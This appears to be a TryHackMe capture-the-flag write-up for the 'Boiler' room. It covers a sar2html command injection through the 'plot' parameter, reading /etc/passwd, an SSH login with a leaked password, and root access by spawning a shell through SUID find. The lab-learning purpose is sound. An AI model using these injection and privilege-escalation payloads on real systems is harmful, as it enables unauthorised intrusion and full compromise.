@@ -1,0 +1,82 @@
+🚩 Write-up: Boiler CTF (Joomla & SUID Exploitation)
+Target IP: 10.49.152.40
+
+Difficulty: Medium
+
+Platform: TryHackMe
+
+Objective: Capture user.txt and root.txt flags.
+
+1. Enumeration
+The first phase involved a comprehensive scan of the target IP to identify open services and potential entry points.
+
+Service Scanning (Nmap)
+The scan revealed several open ports:
+
+Port 21 (FTP): Potential for anonymous login or brute force.
+
+Port 22 (SSH): Secure shell access.
+
+Port 80 (HTTP): Web server running Apache.
+
+Port 10000 (Webmin): System administration control panel.
+
+Web Directory Discovery
+Deep scanning of the web server uncovered a /joomla directory with Directory Listing enabled. This allowed for the discovery of sensitive development files.
+
+Key Findings:
+
+unit-tests.sh: Leaked internal paths like /opt/src and confirmed database testing (MySQL/Postgres).
+
+docker-compose.yml: Exposed the database username joomla_ut.
+
+Makefile: Revealed file movement patterns to /media/jui/.
+
+2. Initial Access - RCE Exploitation
+While navigating the directories, a tool named sar2html (System Activity Report) was found under the /joomla/_test/ directory. This tool is known for a Command Injection vulnerability.
+
+Exploitation
+The plot parameter was found to be vulnerable to command injection by appending a semicolon followed by a system command.
+
+Payload: http://10.49.152.40/joomla/_test/index.php?plot=;whoami
+
+Result: The page rendered the output www-data, confirming Remote Code Execution (RCE).
+
+By reading /etc/passwd via the injection, two primary system users were identified: stoner and basterd.
+
+3. Privilege Escalation - User Level
+Using information gathered during the enumeration phase (a double Base64 encoded string: "Whoppa daisy"), we attempted an SSH login.
+
+SSH Connection: ssh stoner@10.49.152.40
+
+Password: Whoppa daisy
+
+User Flag: Located at /home/basterd/user.txt.
+
+4. Privilege Escalation - Root Level
+After gaining user access, we looked for a path to root. We scanned the system for files with the SUID (Set User ID) bit set.
+
+SUID Discovery
+Running the command find / -perm -u=s -type f 2>/dev/null identified that /usr/bin/find had the SUID bit set. This is a critical misconfiguration that allows any user to execute commands as root through the find utility.
+
+Root Shell Execution (GTFOBins)
+Using the -exec function of the SUID-enabled find command, we spawned a privileged shell:
+
+Bash
+
+/usr/bin/find . -exec /bin/sh -p \; -quit
+-p: Ensures the shell retains the effective root UID.
+
+Result: whoami -> root
+
+5. Conclusion & Flags
+With root access secured, the final flags were retrieved:
+
+User Flag: cat /home/basterd/user.txt
+
+Root Flag: cat /root/root.txt
+
+Lessons Learned
+Information Disclosure: Leaving Makefile, .sh, and .yml files in a web-accessible directory provides a roadmap for attackers.
+
+SUID Misconfiguration: Granting SUID permissions to powerful binaries like find is a direct path to full system compromise (GTFOBins).
